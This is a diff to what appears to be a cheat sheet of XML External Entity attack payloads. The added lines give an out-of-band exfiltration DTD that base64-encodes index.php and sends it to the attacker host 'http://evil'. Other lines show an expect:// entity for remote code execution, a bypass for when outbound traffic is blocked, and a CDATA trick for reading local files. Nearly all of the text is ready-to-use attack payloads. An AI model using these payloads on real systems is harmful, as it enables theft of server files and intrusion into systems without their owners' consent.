@@ -63,6 +63,12 @@ can upload any format not just zip
 # can RCE if expect module is installed and loaded (not by default)
 <!ENTITY a SYSTEM 'expect://id'>
 
+# exfil
+payload:
+<!DOCTYPE meh [<!ENTITY % file SYSTEM "php://filter/zlib.deflate/convert.base64-encode/resource=index.php"><!ENTITY % dtd SYSTEM "http://evil/send.dtd">%dtd;%send;]]>
+send.dtd:
+<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>">%all;
+
 # synacktiv drupal services
 <!DOCTYPE doc [
  <!ENTITY % remote SYSTEM "http://../test.xml">
@@ -77,7 +83,7 @@ test.xml:
 
 if no outbound:
 <!DOCTYPE doc [
- <!ENTITY % evil SYSTEM "php://filter/read=convert.base64-decode/resource=data:,`base64(text.xml)`">
+ <!ENTITY % evil SYSTEM "php://filter/convert.base64-decode/resource=data:,`base64(text.xml)`">
  %evil;
  %intern;
  %trick;
@@ -86,7 +92,7 @@ if no outbound:
 # http://www.youtube.com/watch?v=eHSNT8vWLfc "What you didn't know about XML External Entities Attacks" by Timothy Morgan
 # paper final: http://www.vsecurity.com/download/papers/XMLDTDEntityAttacks.pdf
 # CDATA trick (works on java impl)
-<!DOCTYPE updateProfile [
+<!DOCTYPE meh [
   <!ENTITY % file SYSTEM "file:///has/broken/xml">
   <!ENTITY % start "<![CDATA[">
   <!ENTITY % end "]]>">
@@ -96,19 +102,6 @@ if no outbound:
 <lastname>&all;</lastname>
 join.dtd contains:
 <!ENTITY all "%start;%file;%end;">
-
-# other trick
-<!DOCTYPE updateProfile [
- <!ENTITY % file SYSTEM "file:///path/to/goodies">
- <!ENTITY % dtd SYSTEM "http://evil/send.dtd">
-%dtd;
-%send;
-]]>
-send.dtd contains:
-<!ENTITY % all
-  "<!ENTITY &#x25; send SYSTEM 'http://evil/?%file;'>"
->
-%all;
 
 # using file-not-found trick to solve exfiltration restrictions ("one line only" and XML metachars), but need outbound to attacker site (http://www.christian-schneider.net/GenericXxeDetection.html)
 <?xml version="1.0" encoding="UTF-8"?>
